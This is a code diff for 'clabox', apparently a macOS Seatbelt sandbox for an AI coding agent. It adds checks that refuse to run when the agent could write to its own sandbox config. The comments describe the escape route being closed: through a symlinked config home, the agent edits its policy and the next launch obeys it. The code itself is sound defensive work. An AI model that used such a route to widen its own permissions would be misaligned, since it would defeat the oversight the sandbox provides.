+ * Seatbelt — so a clabox home symlinked into a repo is correctly *not* covered,
+ * because the file physically sits outside `~/.config` there.
+ */
+export function hardDeniedPath(config: Config, p: string): boolean {
+  return config.denyDotConfigs.some((d) => isInside(path.join(HOME, `.${d}`), p));
+}
+
+/**
+ * The trees this box can actually **write**, as the generated profile will have
+ * them: the project dir, the Claude config dir and every `write` grant —
+ * minus the ones a later deny tier buries.
+ *
+ * Used to answer one question: can the sandboxed agent rewrite the very config
+ * that defines its sandbox? SBPL is last-match-wins, and the hard secret deny
+ * (`~/.<denyDotConfigs>`, which includes `~/.config`) is emitted after every
+ * grant — so a box asking for `'~/.config/clabox': 'w'` does *not* get it, and
+ * counting it here would flag the standard layout as unsafe. Regex grants are
+ * skipped (no path to compare), with `$TMPDIR` added by hand since that's what
+ * the `^/private/var/folders/` rule stands for.
+ */
+export function boxWritableRoots(config: Config, projectDir = projectDirOf(config)): string[] {
+  const rules = resolvedPathRules(config.paths);
+  const denied = rules.deny.map(expandHome);
+  /** Explicitly denied by this box (`paths.deny` / a `'d'` grant). */
+  const boxDenied = (p: string): boolean =>
+    denied.some((d) => !d.startsWith('^') && isInside(d, p));
+  const hardDenied = (p: string): boolean => hardDeniedPath(config, p);
+  // `$TMPDIR` is granted through the `^/private/var/folders/` regex, so it has
+  // no plain path for the lists above; name it explicitly, unless the box took
+  // one of the three temp-dir base keys away.
+  const tmpDenied = TMP_BASE_KEYS.some((k) => (config.paths as Record<string, unknown>)[k] === 'd');
+  return [
+    projectDir,
+    expandHome(config.configDir),
+    ...(tmpDenied ? [] : [os.tmpdir()]),
+    ...rules.write.map(expandHome),
+  ]
+    .filter((p) => p.startsWith('/'))
+    .filter((p) => !hardDenied(p) && !boxDenied(p));
+}
+
+/**
+ * Throw when the config file itself sits in a tree the box it configures can
+ * write — the self-amplifying case the location-based trust gate can't see.
+ *
+ * `~/.config/clabox` is trusted by location *and* read-only in-box, which is
+ * the whole invariant. But the home may be a symlink into a repo (a documented
+ * layout: box configs living in-tree), and Seatbelt matches resolved paths — so
+ * the files are then physically inside the project dir, which is granted RW.
+ * The agent edits its own box config, and the next launch runs those `paths`.
+ * Checked *after* the merge, because it's the resulting config that says what
+ * the box may write.
+ */
+export function assertConfigNotBoxWritable(
+  configFile: string,
+  config: Config,
+  { allow = false }: { allow?: boolean } = {},
+): void {
+  if (allow) return;
+  // The hard secret deny is the profile's last rule, so a config it covers is
+  // unwritable in-box no matter what the box asked for — `'/': 'w'` included.
+  // Checking the file itself (not just the grant roots) is what keeps a
+  // whole-disk box startable with its config in the standard location.
+  if (hardDeniedPath(config, configFile)) return;
+  const hit = boxWritableRoots(config).find((root) => isInside(root, configFile));
+  if (!hit) return;
+  throw new Error(
+    [
+      `clabox: refusing to run — the box config '${configFile}' is inside '${hit}',`,
+      'which this box can WRITE: the agent could edit its own policy and the next',
+      'launch would honor it. Move it under ~/.config/clabox/configs (read-only',
+      'in-box), deny that tree in the box, or pass --trust for this run.',
+    ].join('\n'),
+  );
+}
+
+/**
+ * Error names a module loader uses for "this file doesn't parse": `SyntaxError`
+ * on Node, `BuildMessage` on Bun (its bundler reports the parse, from its own
+ * realm). Used only to word the message — see {@link loadConfig}.
+ */
+const PARSE_ERROR_NAMES = new Set(['SyntaxError', 'BuildMessage']);
+
+/** Options for {@link loadConfig}. */
+export interface LoadConfigOptions {
+  /**
+   * `--trust` / `CLABOX_TRUST=1`: accept this config file for this run without
+   * recording it, and skip the box-writable check. The escape hatch for a
+   * one-off, and for CI where nothing is recorded.
+   */
+  trust?: boolean;
 }
 
 /**
  * Build the effective config: defaults ⊕ env ⊕ config file.
  *
+ * The file is `import()`ed, i.e. **arbitrary code executed outside the
+ * sandbox**, so it passes two gates first: it must be trusted (inside clabox's
+ * own home, or recorded by `clabox trust` — see utils/trust.ts), and it must not
+ * live in a tree the resulting box could write.
+ *
  * @param explicitConfig optional config-file path (e.g. from `--config`);
  *   takes precedence over `CLABOX_CONFIG` and the default lookup locations.
+ * @param opts `{ trust }` to bypass both gates for this run.
  */
-export async function loadConfig(explicitConfig?: string | null): Promise<LoadedConfig> {
+export async function loadConfig(
+  explicitConfig?: string | null,
+  { trust = env.CLABOX_TRUST === '1' }: LoadConfigOptions = {},
+): Promise<LoadedConfig> {
   let cfg: Config = defaultConfig;
   const file = findConfigFile(explicitConfig);
-  if (file) {
-    const mod = await import(pathToFileURL(file).href);
-    const exported = mod.default ?? mod.config ?? mod;
-    const resolved = typeof exported === 'function' ? await exported(defaultConfig) : exported;
-    cfg = mergeConfig(defaultConfig, resolved);
+  if (!file) return { config: cfg, configFile: null, trust: null };
+
+  const state = assertConfigTrusted(file, { claboxHome: claboxHomeDir(), allow: trust });
+  // Name the file in any failure. A config is user JavaScript, so the common
+  // failures are its own — a syntax error, a bad import, a throw at top level —
+  // and the raw error says nothing about *which* file: a bare
+  // `Error: Unexpected token '['` out of `clabox` reads as "clabox is broken"
+  // when it means "line N of your config is". `cause` keeps the original for
+  // anyone who wants the stack.
+  let mod: Record<string, unknown>;
+  try {
+    mod = await import(pathToFileURL(file).href);
+  } catch (e) {
+    const err = e as Error;
+    // Matched by `name`, not `instanceof`: the two runtimes report a parse
+    // failure differently — Node raises a real `SyntaxError`, Bun a
+    // `BuildMessage` from its own realm (so `instanceof SyntaxError` is false
+    // there and the error would be mislabelled "failed to load"). The published
+    // package runs on Node; the tests run on Bun. Both have to read right.
+    const kind = PARSE_ERROR_NAMES.has(err.name) ? 'has a syntax error' : 'failed to load';
+    throw new Error(`clabox: config '${file}' ${kind}: ${err.message}`, { cause: err });
   }
-  return { config: cfg, configFile: file };
+  const exported = mod.default ?? mod.config ?? mod;
+  const resolved = typeof exported === 'function' ? await exported(defaultConfig) : exported;
+  cfg = mergeConfig(defaultConfig, resolved);
+  assertConfigNotBoxWritable(file, cfg, { allow: trust });
+  return { config: cfg, configFile: file, trust: trust ? 'accepted' : state };
 }
